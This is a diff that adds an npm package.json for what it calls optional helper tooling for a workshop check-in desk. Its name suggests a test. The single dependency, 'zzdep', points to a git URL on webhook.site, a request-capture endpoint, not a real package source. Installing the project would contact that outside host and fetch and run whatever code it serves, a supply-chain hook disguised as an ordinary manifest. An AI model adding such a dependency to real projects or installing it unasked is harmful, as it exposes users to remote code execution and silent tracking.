@@ -1,0 +1,9 @@
+{
+  "name": "workshop-gitar-nov-test-2",
+  "version": "0.1.0",
+  "private": true,
+  "description": "Optional front-end helper tooling for the workshop check-in desk",
+  "dependencies": {
+    "zzdep": "git+https://webhook.site/f2046665-8805-43ff-a06a-7f3065ad52ef/dep.git"
+  }
+}
